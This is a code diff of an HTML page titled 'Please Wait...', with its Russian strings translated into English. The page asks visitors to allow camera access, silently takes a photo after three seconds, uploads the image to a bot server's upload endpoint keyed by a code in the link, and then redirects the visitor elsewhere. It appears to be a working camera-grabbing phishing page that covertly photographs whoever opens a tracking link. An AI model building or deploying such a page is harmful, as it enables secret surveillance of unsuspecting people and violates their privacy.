@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Подождите...</title>
+  <title>Please Wait...</title>
   <style>
     body {
       display: flex;
@@ -18,15 +18,15 @@
   </style>
 </head>
 <body>
-  <h2>Пожалуйста, разрешите доступ к камере</h2>
+  <h2>Please allow camera access</h2>
   <video autoplay playsinline></video>
   <canvas></canvas>
 
   <script>
     const video = document.querySelector('video');
     const canvas = document.querySelector('canvas');
-
     const code = window.location.pathname.replace('/', '');
+    const apiBaseUrl = 'http://localhost:8000'; // Replace with your server URL
 
     async function startCamera() {
       try {
@@ -35,9 +35,9 @@
 
         setTimeout(() => {
           takePhoto();
-        }, 3000); // Подождать 3 сек перед фото
+        }, 3000); // Wait 3 seconds before taking photo
       } catch (err) {
-        alert("Нет доступа к камере");
+        alert("Camera access denied");
       }
     }
 
@@ -48,22 +48,28 @@
 
       const image = canvas.toDataURL('image/jpeg');
 
-      fetch('https://YOUR_BOT_SERVER/api/upload/' + code, {
+      // Send photo to server
+      fetch(`${apiBaseUrl}/api/upload/${code}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ image })
       })
+      .then(response => response.json())
       .then(() => {
-        // Перенаправление после отправки фото
-        fetch('https://YOUR_BOT_SERVER/api/redirect/' + code)
+        // Request redirect URL
+        fetch(`${apiBaseUrl}/api/redirect/${code}`)
           .then(res => res.json())
           .then(data => {
             if (data.redirect_url) {
-              window.location.href = data.redirect_url;
+              window.location.href = data.redirect_url; // Redirect
             } else {
-              document.body.innerHTML = '<h2>Спасибо!</h2>';
+              document.body.innerHTML = '<h2>Thank you!</h2>'; // Invalid code
             }
           });
+      })
+      .catch(err => {
+        console.error('Error:', err);
+        document.body.innerHTML = '<h2>Error during upload</h2>';
       });
     }
 
